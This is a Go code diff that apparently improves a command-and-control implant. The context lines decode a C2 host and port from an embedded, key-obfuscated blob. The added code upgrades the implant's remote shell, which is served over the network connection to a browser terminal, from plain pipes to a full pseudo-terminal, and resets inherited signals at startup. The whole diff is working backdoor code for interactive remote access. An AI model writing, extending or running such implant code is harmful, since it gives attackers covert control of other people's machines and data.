@@ -38,6 +38,8 @@ func c2Field(b []byte, key byte) string {
 }
 
 func main() {
+	// before anything else: children must not inherit an ignored SIGINT
+	resetInheritedSignals()
 	host := c2Field(c2Patch[9:72], c2Patch[8])
 	port := c2Field(c2Patch[72:80], c2Patch[8])
 	if host == "" {
@@ -232,12 +234,28 @@ func session(c net.Conn) int {
 				// and nothing emits the escape sequences the browser terminal needs.
 				cmd.Env = append(os.Environ(), "LANG=en_US.UTF-8", "LC_ALL=en_US.UTF-8",
 					"TERM=xterm-256color", "COLORTERM=truecolor", "CHCP=65001")
-				in, e1 := cmd.StdinPipe()
-				out, e2 := cmd.StdoutPipe()
-				cmd.Stderr = cmd.Stdout
-				if e1 != nil || e2 != nil || cmd.Start() != nil {
-					_ = writeFrame(c, protocol.RspErr, []byte("shell fail"))
-					break
+				// A pty gives the shell a controlling terminal (job control,
+				// readline, full-screen programs). Pipes remain the fallback.
+				ptyMaster, ptyCleanup, ptyErr := attachPTY(cmd)
+				var in io.WriteCloser
+				var out io.ReadCloser
+				if ptyErr == nil {
+					if err := cmd.Start(); err != nil {
+						ptyCleanup()
+						_ = writeFrame(c, protocol.RspErr, []byte("shell fail"))
+						break
+					}
+					ptyCleanup() // the child holds its own copy of the slave
+					in, out = ptyMaster, ptyMaster
+				} else {
+					var e1, e2 error
+					in, e1 = cmd.StdinPipe()
+					out, e2 = cmd.StdoutPipe()
+					cmd.Stderr = cmd.Stdout
+					if e1 != nil || e2 != nil || cmd.Start() != nil {
+						_ = writeFrame(c, protocol.RspErr, []byte("shell fail"))
+						break
+					}
 				}
 				shMu.Lock()
 				shIn, shOut, shCmd = in, out, cmd
